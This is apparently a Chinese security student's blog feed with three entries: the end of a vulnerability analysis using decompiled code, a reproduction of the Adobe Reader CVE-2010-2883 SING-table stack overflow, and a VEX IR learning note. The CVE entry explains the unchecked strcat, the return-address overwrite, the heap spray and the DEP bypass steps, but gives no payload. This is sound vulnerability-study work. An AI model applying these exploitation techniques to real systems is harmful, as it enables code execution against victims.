*)&amp;NumberOfBytesWritten;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = v6 - v5;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)v7 )</span><br><span class="line">        v7 = v4;</span><br><span class="line">      <span class="built_in">memcpy</span>(a1, &amp;dword_3088EC40[v5], v7);</span><br><span class="line">      v4 -= v7;</span><br><span class="line">      v5 = v7 + dword_30892C44;</span><br><span class="line">      a1 = (<span class="keyword">char</span> *)a1 + v7;</span><br><span class="line">      dword_30892C44 += v7;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *(_DWORD *)&amp;NumberOfBytesWritten == <span class="number">16384</span> );</span><br><span class="line">    result = a1 - a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到一个memcpy…</p>
<p>再向上看看，发现v7的变化是从这个片段中的子函数来的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v94 == <span class="number">167</span> )                     <span class="comment">// 判断recode type是否为0xA7</span></span><br><span class="line">&#123;</span><br><span class="line">  v9 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + v6);</span><br><span class="line">  v10 = dword_30895B44 &lt; <span class="number">5</span>;</span><br><span class="line">  LOBYTE(v10) = dword_30895B44 &gt;= <span class="number">5</span>;</span><br><span class="line">  v98 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + v6);</span><br><span class="line">  LOWORD(v9) = *(_WORD *)((<span class="keyword">char</span> *)v7 + <span class="number">1</span>);</span><br><span class="line">  v81 = *(_WORD *)((<span class="keyword">char</span> *)v7 + <span class="number">1</span>);</span><br><span class="line">  v11 = <span class="number">2</span> * v10 + <span class="number">2</span>;</span><br><span class="line">  v12 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + v11 * v81 + <span class="number">3</span>);</span><br><span class="line">  v92 = v9;</span><br><span class="line">  i = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">char</span> *)v7 + <span class="number">3</span>);</span><br><span class="line">  v96 = v11;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> __int16)v9 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      --v92;</span><br><span class="line">      v13 = i;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v14 = v93;</span><br><span class="line">        <span class="keyword">if</span> ( dword_30895B44 &gt;= <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v97 = *(_DWORD *)v13;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LOWORD(v97) = *(_BYTE *)v13;</span><br><span class="line">          HIWORD(v97) = *(_BYTE *)(v13 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( (_WORD)v97 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v13 += v96;</span><br><span class="line">        v15 = v92--;</span><br><span class="line">        v93 = <span class="number">1</span>;</span><br><span class="line">        i = v13;</span><br><span class="line">        <span class="keyword">if</span> ( !v15 )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = v93;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( HIWORD(v97) &amp; <span class="number">0x12F</span> &amp;&amp; v12 &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v98 )</span><br><span class="line">      &#123;</span><br><span class="line">        v94 = sub_300DE7C5();         <span class="comment">// v93 = 0x3C</span></span><br><span class="line">        <span class="keyword">if</span> ( v94 != <span class="number">0x3C</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_187;</span><br><span class="line">        v16 = sub_300DE7C5();         <span class="comment">// 返回复制字节数0x300</span></span><br><span class="line">        v17 = v96 * v81;              <span class="comment">// v80 = 0x0C0F,v95 = 0x4</span></span><br><span class="line">        v98 = v16;</span><br><span class="line">        v12 = (<span class="keyword">int</span>)((<span class="keyword">char</span> *)v95 + v96 * v81 + <span class="number">3</span>);</span><br><span class="line">        v18 = sub_300C3AA4();</span><br><span class="line">        VulFun(v5, (<span class="keyword">void</span> *)v12, v98, <span class="number">-3</span> - v17 + v18);</span><br></pre></td></tr></table></figure>
<p>sub_300DE7C5</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">t __cdecl <span class="title">sub_300DE7C5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ecx@1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi@5</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx@5</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax@6</span></span><br><span class="line"></span><br><span class="line">  v0 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">  v1 = dword_30892C44;</span><br><span class="line">  <span class="keyword">if</span> ( dword_30892C44 &gt;= *(_DWORD *)&amp;NumberOfBytesWritten - <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_30892C44 &gt;= *(_DWORD *)&amp;NumberOfBytesWritten )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_3011A989(<span class="number">1</span>);</span><br><span class="line">      v1 = dword_30892C44;</span><br><span class="line">      v0 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = dword_3088EC40[v1];</span><br><span class="line">    v4 = v1 + <span class="number">1</span>;</span><br><span class="line">    dword_30892C44 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_3011A989(<span class="number">1</span>);</span><br><span class="line">      v4 = dword_30892C44;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    *(_WORD *)((<span class="keyword">char</span> *)&amp;v5 + <span class="number">1</span>) = dword_3088EC40[v4];</span><br><span class="line">    dword_30892C44 = v4 + <span class="number">1</span>;</span><br><span class="line">    result = v5 | v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_WORD *)&amp;dword_3088EC40[dword_30892C44];</span><br><span class="line">    dword_30892C44 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实是直接复制并使用了样本文件中CONTINUE的Len字段的值，没有进行判断</p>
<h2 id="后记">后记</h2>
<p>在网上查了一下污点追踪，大概是一个定位漏洞的方法，感觉这个方法确实挺常用的（吧）。另外，找到了一篇武大的基于污点追踪的嵌入式固件漏洞研究的论文。<br>
感觉这两次复现对于调试能力的提升还是很大的，但总是研究到漏洞的触发就感觉差不多了，至于shellcode和修复就没太想继续研究…</p>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsdWVibG9vZHllL2FydGljbGUvZGV0YWlscy8xMDQ5MTExNjg=">https://blog.csdn.net/bluebloodye/article/details/104911168<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Win漏洞分析</tag>
        <tag>漏洞战争</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2010-2883 Adobe Reader TFF字体SING表栈溢出漏洞</title>
    <url>/57740.html</url>
    <content><![CDATA[<p>Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING（Smart INdependent Glyphlets）中的uniqueName项时存在栈溢出漏洞。用户打开特制的PDF就可以执行任意恶意代码</p>
<span id="more"></span>
<h2 id="分析环境">分析环境</h2>
<table>
<thead>
<tr>
<th>项目</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>WindowsXP PS3 32位</td>
</tr>
<tr>
<td>调试器</td>
<td>OD 1.10 吾爱汉化版</td>
</tr>
<tr>
<td>反编译器</td>
<td>IDA6.5</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>Adobe Reader 9.3.4</td>
</tr>
</tbody>
</table>
<p>注：根据CVE的描述，漏洞影响的范围包括了Windows和macos上，9.4前的9.x和8.2.5前的8.x</p>
<h2 id="漏洞分析">漏洞分析</h2>
<h3 id="静态分析">静态分析</h3>
<p>IDA反汇编CoolType.dll，易定位漏洞<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414202752.png" alt="20210414202752"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414202821.png" alt="20210414202821"><br>
注意到在pwn题里常见的危险函数strcat，且在调用strcat前并没有对长度进行判断</p>
<h3 id="漏洞样本">漏洞样本</h3>
<p>用二进制查看工具打开书中提供的TTF文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//TFF中SING表的入口结构</span></span><br><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];    <span class="comment">//标记&quot;SING&quot;</span></span><br><span class="line">    ULONG checksum; <span class="comment">//校验和</span></span><br><span class="line">    ULONG offset;   <span class="comment">//相对偏移</span></span><br><span class="line">    ULONG length;   <span class="comment">//数据长度</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414210833.png" alt="20210414210833"><br>
再根据书中提供的SING表结构，找到uniqueName（BYTE[28]）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210414211429.png" alt="20210414211429"><br>
即strcat后，这个部分就将复制到指定的区域</p>
<h3 id="动态调试">动态调试</h3>
<hr>
<ul>
<li>注：在调试时遇到了一个问题…Adobe Reader挂上od后打开任何pdf都会发生异常然后结束运行。百度后发现是od调试选项的问题，在选项里加上最后一个“忽略指定异常”应该就可以正常调试<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415212329.png" alt="20210415212329"></li>
</ul>
<p>再：几天后在看雪上也看到了类似的问题和泉哥给出的建议：<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yMTI1NTYuaHRt">https://bbs.pediy.com/thread-212556.htm<i class="fa fa-external-link-alt"></i></span></p>
<hr>
<p>打开OD，加载Adobe Reader，F9，在0x0803DD74和0x0803DDAB处下断点，打开能触发漏洞的pdf</p>
<p>F9运行至push “SING”后再单步运行至最近的call函数，<br>
此时ECX指向SING表的入口地址，进入[0012E4B4]就可以找到SING表<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415214856.png" alt="20210415214856"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415215446.png" alt="20210415215446"><br>
可以看出两个断点间代码的作用是判断SING表入口的有效性，并把uniqueName的地址传给EAX</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：上2图不是同一次运行的截图，所以地址不一样   </span><br></pre></td></tr></table></figure>
<p>F9+F8到strcat的下一行，即发生溢出后，查看此时的栈帧情况（看起来GS至少在WinXP就有了）<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415221211.png" alt="20210415221211"><br>
此时返回地址已经被更改成了icucnv36.dll，通过工具可以知道这个库没有开启ASLR</p>
<p>往下运行到0x0808B308，这里是一个进入icucnv36.dll的call指令，跟进去看一看<br>
只有简单的三条指令：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415222508.png" alt="20210415222508"><br>
调整了ebp</p>
<p>运行至0xA82A714<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415223734.png" alt="20210415223734"><br>
而0c0c0c0c处的内容为：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415224754.png" alt="20210415224754"><br>
可以看出是一个堆喷。</p>
<p>后续的操作依次调用了CreateFileA、CreateFileMappingA、MapViewOfFile，开辟出一块可读写可执行的区域绕过DEP(NX)并写入shellcode，随后执行shellcode</p>
<h2 id="流程总结">流程总结</h2>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210415225645.png" alt="20210415225645"></p>
<h1>后记</h1>
<p>调试的第一个RW漏洞，感觉比想象中的漏洞复现复杂一些，并不是跟着别人/书里的步骤一步步执行就可以的，还可能遇到一些环境的问题（which整了好久，感谢021w师傅的指导orz）和要琢磨好久的点。<br>
がんばって</p>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTE4MDEuaHRt">https://bbs.pediy.com/thread-251801.htm<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly8wMjF3LmdpdGh1Yi5pby8yMDIwLzA4LzAxL0NWRS0yMDEwLTI4ODMlRTYlQTAlODglRTYlQkMlOEYlRTYlQjQlOUUlRTUlODglODYlRTYlOUUlOTAv">https://021w.github.io/2020/08/01/CVE-2010-2883栈漏洞分析/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Win漏洞分析</tag>
        <tag>漏洞战争</tag>
      </tags>
  </entry>
  <entry>
    <title>VEX IR学习</title>
    <url>/52443.html</url>
    <content><![CDATA[<p>搞这个的原因是课题那边，把基本块转成VEX IR后需要进行一些modify。老师：你这周就先把VEX IR （和LLVM IR ）看懂</p>
<p>所以这篇的要求也就是能看懂和在变量名之类的做一点优化（统一）就行了</p>
<span id="more"></span>
<h2 id="代码1">代码1</h2>
<p>从程序里转了一段中间代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I32 t7:Ity_I32 t8:Ity_I32 t9:Ity_I32 t10:Ity_I32 t11:Ity_I32 t12:Ity_I32 t13:Ity_I32 t14:Ity_I32 t15:Ity_I32 t16:Ity_I32 t17:Ity_I32 t18:Ity_I32 t19:Ity_I32 t20:Ity_I32 t21:Ity_I32 t22:Ity_I32 t23:Ity_I32 t24:Ity_I32 t25:Ity_I32 t26:Ity_I32 t27:Ity_I32</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x80491b0, 1, 0) ------</span><br><span class="line">   01 | t0 = GET:I32(ebp)</span><br><span class="line">   02 | t13 = GET:I32(esp)</span><br><span class="line">   03 | t12 = Sub32(t13,0x00000004)</span><br><span class="line">   04 | PUT(esp) = t12</span><br><span class="line">   05 | STle(t12) = t0</span><br><span class="line">   06 | ------ IMark(0x80491b1, 2, 0) ------</span><br><span class="line">   07 | PUT(ebp) = t12</span><br><span class="line">   08 | ------ IMark(0x80491b3, 3, 0) ------</span><br><span class="line">   09 | t2 = Sub32(t12,0x00000018)</span><br><span class="line">   10 | PUT(cc_op) = 0x00000006</span><br><span class="line">   11 | PUT(cc_dep1) = t12</span><br><span class="line">   12 | PUT(cc_dep2) = 0x00000018</span><br><span class="line">   13 | PUT(cc_ndep) = 0x00000000</span><br><span class="line">   14 | PUT(esp) = t2</span><br><span class="line">   15 | PUT(eip) = 0x080491b6</span><br><span class="line">   16 | ------ IMark(0x80491b6, 7, 0) ------</span><br><span class="line">   17 | t15 = Add32(t12,0xfffffffc)</span><br><span class="line">   18 | STle(t15) = 0x00000000</span><br><span class="line">   19 | PUT(eip) = 0x080491bd</span><br><span class="line">   20 | ------ IMark(0x80491bd, 7, 0) ------</span><br><span class="line">   21 | t17 = Add32(t12,0xfffffff8)</span><br><span class="line">   22 | STle(t17) = 0x00000000</span><br><span class="line">   23 | ------ IMark(0x80491c4, 6, 0) ------</span><br><span class="line">   24 | PUT(eip) = 0x080491ca</span><br><span class="line">   25 | ------ IMark(0x80491ca, 3, 0) ------</span><br><span class="line">   26 | STle(t2) = 0x0804a021</span><br><span class="line">   27 | ------ IMark(0x80491cd, 3, 0) ------</span><br><span class="line">   28 | t20 = Add32(t12,0xfffffff8)</span><br><span class="line">   29 | PUT(eax) = t20</span><br><span class="line">   30 | PUT(eip) = 0x080491d0</span><br><span class="line">   31 | ------ IMark(0x80491d0, 4, 0) ------</span><br><span class="line">   32 | t22 = Add32(t2,0x00000004)</span><br><span class="line">   33 | STle(t22) = t20</span><br><span class="line">   34 | PUT(eip) = 0x080491d4</span><br><span class="line">   35 | ------ IMark(0x80491d4, 5, 0) ------</span><br><span class="line">   36 | t25 = Sub32(t2,0x00000004)</span><br><span class="line">   37 | PUT(esp) = t25</span><br><span class="line">   38 | STle(t25) = 0x080491d9</span><br><span class="line">   NEXT: PUT(eip) = 0x08049060; Ijk_Call</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>angr输出的反编译代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.pp()</span><br><span class="line">0x80491b0:	push	ebp</span><br><span class="line">0x80491b1:	mov	ebp, esp</span><br><span class="line">0x80491b3:	sub	esp, 0x18</span><br><span class="line">0x80491b6:	mov	dword ptr [ebp - 4], 0</span><br><span class="line">0x80491bd:	mov	dword ptr [ebp - 8], 0</span><br><span class="line">0x80491c4:	lea	eax, [0x804a021]</span><br><span class="line">0x80491ca:	mov	dword ptr [esp], eax</span><br><span class="line">0x80491cd:	lea	eax, [ebp - 8]</span><br><span class="line">0x80491d0:	mov	dword ptr [esp + 4], eax</span><br><span class="line">0x80491d4:	call	0x8049060</span><br></pre></td></tr></table></figure>
<p>对应ida中选中的部分：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210428124520.png" alt="20210428124520"></p>
<h3 id="分析1">分析1</h3>
<p>首先第一行表示函数的开始（IRSB在此处无意义）<br>
IRSB:</p>
<p>后续的一堆tx:Ity blabla 代表临时变量，同时指明了变量类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quote:Temporary variables. VEX uses temporary variables as internal registers.</span><br><span class="line">These temporaries are strongly typed (i.e., &quot;64-bit integer&quot; or &quot;32-bit float&quot;).</span><br></pre></td></tr></table></figure>
<p>IMark没有实际意义，仅作为一个statement，括号中的内容分别代表了在程序中的起始地址、指令长度和（不知道，不过只见过值=0）</p>
<p>对寄存器操作前需要读取该寄存器[GET]<br>
操作结束后将值写回[PUT]</p>
<p>t0 = GET:I32(ebp)：t0 gets ebp, which is a 32bit integer</p>
<p>t12 = Sub32(t13,0x00000004): t12 = t13 - 0x4</p>
<p>PUT(esp) = t12: esp = t12<br>
   [Update a register with the value of the given IR Expression.]</p>
<p>STle(t12) = t0: [t12] = t0<br>
  Update a location in memory, “le” in STle (and LDle) stands for “little-endian”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0~7行大概干了个</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br></pre></td></tr></table></figure>
<p>09行的命令很直白，但10~15指的是啥呢…似乎跟10~13出现的&quot;cc_*&quot;有挺大关系，但“cc_”只出现在arm架构的文档中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># NOTE 2: Something is goofy w/r/t archinfo and VEX; cc_op3 is used in ccalls, but there&#x27;s</span><br><span class="line"># no cc_op3 in archinfo, angr itself uses cc_depn instead.  We do the same.</span><br></pre></td></tr></table></figure>
<p>17~22对应了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     [ebp-4], 0</span><br><span class="line">mov     [ebp-4], 0</span><br></pre></td></tr></table></figure>
<p>t15=t12+0xfffffffc，此时t12=ebp。看起来很奇怪，但其实把t15指向了ebp-4的位置，（不过为啥不用减法了？…）</p>
<p>24~26行实现了两条语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x80491c4:	lea	eax, [0x804a021]</span><br><span class="line">0x80491ca:	mov	dword ptr [esp], eax</span><br></pre></td></tr></table></figure>
<p>24行：没有实际意义<br>
26行：<br>
此时t2=esp，把esp指向的值改为0x0804a021d<br>
相当于mov [esp],[0x804a021]<br>
所以其实是再进行了优化的（可能这就是RISC吧…)</p>
<p>28~34:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x80491cd:	lea	eax, [ebp - 8]</span><br><span class="line">0x80491d0:	mov	dword ptr [esp + 4], eax</span><br></pre></td></tr></table></figure>
<p>但并没有像上面一样绕过eax，直接对内存的进行修改，应该是因为针对一个基本块分析的时候要保存寄存器最后的值，不能再优化了</p>
<p>最后的跳转：<br>
放一个官方对于跳转命令的整理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef</span><br><span class="line">   enum &#123;</span><br><span class="line">      Ijk_INVALID=0x1A00, </span><br><span class="line">      Ijk_Boring,         /* not interesting; just goto next */</span><br><span class="line">      Ijk_Call,           /* guest is doing a call */</span><br><span class="line">      Ijk_Ret,            /* guest is doing a return */</span><br><span class="line">      Ijk_ClientReq,      /* do guest client req before continuing */</span><br><span class="line">      Ijk_Yield,          /* client is yielding to thread scheduler */</span><br><span class="line">      Ijk_EmWarn,         /* report emulation warning before continuing */</span><br><span class="line">      Ijk_EmFail,         /* emulation critical (FATAL) error; give up */</span><br><span class="line">      Ijk_NoDecode,       /* current instruction cannot be decoded */</span><br><span class="line">      Ijk_MapFail,        /* Vex-provided address translation failed */</span><br><span class="line">      Ijk_InvalICache,    /* Inval icache for range [CMSTART, +CMLEN) */</span><br><span class="line">      Ijk_FlushDCache,    /* Flush dcache for range [CMSTART, +CMLEN) */</span><br><span class="line">      Ijk_NoRedir,        /* Jump to un-redirected guest addr */</span><br><span class="line">      Ijk_SigILL,         /* current instruction synths SIGILL */</span><br><span class="line">      Ijk_SigTRAP,        /* current instruction synths SIGTRAP */</span><br><span class="line">      Ijk_SigSEGV,        /* current instruction synths SIGSEGV */</span><br><span class="line">      Ijk_SigBUS,         /* current instruction synths SIGBUS */</span><br><span class="line">      Ijk_SigFPE,         /* current instruction synths generic SIGFPE */</span><br><span class="line">      Ijk_SigFPE_IntDiv,  /* current instruction synths SIGFPE - IntDiv */</span><br><span class="line">      Ijk_SigFPE_IntOvf,  /* current instruction synths SIGFPE - IntOvf */</span><br><span class="line">      Ijk_Privileged,     /* current instruction should fail depending on privilege level */</span><br><span class="line">      /* Unfortunately, various guest-dependent syscall kinds.  They</span><br><span class="line">	 all mean: do a syscall before continuing. */</span><br><span class="line">      Ijk_Sys_syscall,    /* amd64/x86 &#x27;syscall&#x27;, ppc &#x27;sc&#x27;, arm &#x27;svc #0&#x27; */</span><br><span class="line">      Ijk_Sys_int32,      /* amd64/x86 &#x27;int $0x20&#x27; */</span><br><span class="line">      Ijk_Sys_int128,     /* amd64/x86 &#x27;int $0x80&#x27; */</span><br><span class="line">      Ijk_Sys_int129,     /* amd64/x86 &#x27;int $0x81&#x27; */</span><br><span class="line">      Ijk_Sys_int130,     /* amd64/x86 &#x27;int $0x82&#x27; */</span><br><span class="line">      Ijk_Sys_int145,     /* amd64/x86 &#x27;int $0x91&#x27; */</span><br><span class="line">      Ijk_Sys_int210,     /* amd64/x86 &#x27;int $0xD2&#x27; */</span><br><span class="line">      Ijk_Sys_sysenter    /* x86 &#x27;sysenter&#x27;.  guest_EIP becomes </span><br><span class="line">                             invalid at the point this happens. */</span><br><span class="line">   &#125;</span><br><span class="line">   IRJumpKind;</span><br></pre></td></tr></table></figure>
<h2 id="代码2">代码2</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I1 t7:Ity_I32 t8:Ity_I32 t9:Ity_I32 t10:Ity_I32 t11:Ity_I32 t12:Ity_I32 t13:Ity_I32 t14:Ity_I1 t15:Ity_I1</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x80491fd, 4, 0) ------</span><br><span class="line">   01 | t5 = GET:I32(ebp)</span><br><span class="line">   02 | t4 = Add32(t5,0xfffffff8)</span><br><span class="line">   03 | t2 = LDle:I32(t4)</span><br><span class="line">   04 | PUT(cc_op) = 0x00000006</span><br><span class="line">   05 | PUT(cc_dep1) = t2</span><br><span class="line">   06 | PUT(cc_dep2) = 0x0000000a</span><br><span class="line">   07 | PUT(cc_ndep) = 0x00000000</span><br><span class="line">   08 | PUT(eip) = 0x08049201</span><br><span class="line">   09 | ------ IMark(0x8049201, 6, 0) ------</span><br><span class="line">   10 | t14 = CmpEQ32(t2,0x0000000a)</span><br><span class="line">   11 | t13 = 1Uto32(t14)</span><br><span class="line">   12 | t11 = t13</span><br><span class="line">   13 | t15 = 32to1(t11)</span><br><span class="line">   14 | t6 = t15</span><br><span class="line">   15 | if (t6) &#123; PUT(eip) = 0x8049207; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(eip) = 0x08049221; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x80491fd:	cmp	dword ptr [ebp - 8], 0xa</span><br><span class="line">0x8049201:	jne	0x8049221</span><br></pre></td></tr></table></figure>
<p>suprise…汇编好简洁</p>
<p>03行：t2=[t4]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDle：The value stored at a memory address, with the address specified by another IR Expression.</span><br></pre></td></tr></table></figure>
<p>11行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Iop_1Uto32, /* :: Ity_Bit -&gt; Ity_I32, unsigned widen */</span><br></pre></td></tr></table></figure>
<p>看一下寄存器的定义，t14的大小也是一个bit<br>
所以这个命令的作用就是把它扩展成32位的无符号数，放到t13里</p>
<p>13行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Iop_32to1,  /* :: Ity_I32 -&gt; Ity_Bit, just select bit[0] */</span><br></pre></td></tr></table></figure>
<p>再取最低位放到t15里</p>
<p>讲真没看懂这波操作为啥要这么多次转换</p>
<h2 id="分析3-来波大的">分析3_来波大的</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.vex.pp()</span><br><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I64 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I64 t5:Ity_I64 t6:Ity_I32 t7:Ity_I32 t8:Ity_I32 t9:Ity_I64 t10:Ity_I64 t11:Ity_I64 t12:Ity_I64 t13:Ity_I64 t14:Ity_I64 t15:Ity_I64 t16:Ity_I64 t17:Ity_I64 t18:Ity_I128 t19:Ity_I128 t20:Ity_I64 t21:Ity_I64 t22:Ity_I32 t23:Ity_I32 t24:Ity_I32 t25:Ity_I64 t26:Ity_I64 t27:Ity_I64 t28:Ity_I64 t29:Ity_I32 t30:Ity_I32 t31:Ity_I64 t32:Ity_I64 t33:Ity_I64 t34:Ity_I64 t35:Ity_I64 t36:Ity_I32 t37:Ity_I64 t38:Ity_I64 t39:Ity_I64 t40:Ity_I64 t41:Ity_I64 t42:Ity_I64 t43:Ity_I64 t44:Ity_I32 t45:Ity_I64 t46:Ity_I64 t47:Ity_I64 t48:Ity_I32 t49:Ity_I64 t50:Ity_I64 t51:Ity_I64 t52:Ity_I64 t53:Ity_I64 t54:Ity_I32 t55:Ity_I64 t56:Ity_I64 t57:Ity_I64 t58:Ity_I64 t59:Ity_I64 t60:Ity_I64 t61:Ity_I64 t62:Ity_I64 t63:Ity_I64 t64:Ity_I32 t65:Ity_I64 t66:Ity_I64 t67:Ity_I64 t68:Ity_I64 t69:Ity_I64 t70:Ity_I64 t71:Ity_I64 t72:Ity_I32 t73:Ity_I64 t74:Ity_I64 t75:Ity_I64 t76:Ity_I64 t77:Ity_I64 t78:Ity_I64 t79:Ity_I32 t80:Ity_I64 t81:Ity_I64 t82:Ity_I64 t83:Ity_I64 t84:Ity_I128 t85:Ity_I64 t86:Ity_I64 t87:Ity_I64 t88:Ity_I64 t89:Ity_I64 t90:Ity_I64 t91:Ity_I64 t92:Ity_I64 t93:Ity_I64 t94:Ity_I64 t95:Ity_I32 t96:Ity_I32 t97:Ity_I64 t98:Ity_I64 t99:Ity_I64 t100:Ity_I64 t101:Ity_I64 t102:Ity_I64 t103:Ity_I32 t104:Ity_I64 t105:Ity_I64 t106:Ity_I1</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x401163, 3, 0) ------</span><br><span class="line">   01 | t27 = GET:I64(rbp)</span><br><span class="line">   02 | t26 = 